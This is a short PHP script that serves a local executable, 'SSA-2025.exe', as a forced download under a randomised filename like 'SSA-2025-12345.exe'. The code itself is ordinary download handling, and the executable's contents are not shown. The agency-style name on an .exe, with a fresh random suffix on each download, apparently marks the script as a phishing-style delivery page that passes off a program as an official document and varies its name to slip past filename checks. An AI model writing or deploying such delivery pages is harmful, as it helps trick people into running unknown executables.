<?php
// Generate a random 5-digit number
$random_number = rand(10000, 99999);

// Define the file name format
$filename = "SSA-2025-$random_number.exe";

// Define the path to your actual executable file (Make sure it's correct)
$actual_file_path = "SSA-2025.exe"; // Change this to your actual file path

// Check if the file exists before attempting to serve it
if (!file_exists($actual_file_path)) {
    die("File not found.");
}

// Set headers to force download
header("Content-Description: File Transfer");
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=\"$filename\"");
header("Expires: 0");
header("Cache-Control: must-revalidate");
header("Pragma: public");
header("Content-Length: " . filesize($actual_file_path));

// Read and output the file
readfile($actual_file_path);
exit;
?>
